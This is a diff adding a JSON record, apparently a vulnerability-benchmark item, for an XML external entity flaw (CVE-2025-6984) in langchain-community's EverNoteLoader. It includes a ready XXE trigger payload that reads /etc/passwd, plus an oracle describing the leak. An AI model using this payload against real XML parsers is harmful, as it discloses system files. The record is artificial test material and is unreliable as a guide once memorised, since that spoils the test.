@@ -1,0 +1,15 @@
+{
+  "file_id": "141_langchain-community_huntr_a6b521cf-258c-41c0-9edb-d8ef976abb2a",
+  "numeric_id": "141",
+  "library_hint": "langchain-community",
+  "source": "huntr",
+  "title": "Insecure XML parsing in EverNoteLoader due to missing external entity resolution disable",
+  "cve": "CVE-2025-6984",
+  "cwe": "CWE-200: Exposure of Sensitive Information to an Unauthorized Actor",
+  "library": "langchain-community",
+  "affected_version": ">= 0.3.63",
+  "vulnerable_function": "etree.iterparse",
+  "triggerability": "indirect",
+  "trigger_payload": "<!--?xml version=\"1.0\" ?-->\n<!DOCTYPE foo [<!ENTITY example SYSTEM \"/etc/passwd\"> ]>\n<note>\n<content>&example;</content>\n</note>",
+  "oracle": "sensitive information from /etc/passwd is disclosed in the parsed output"
+}
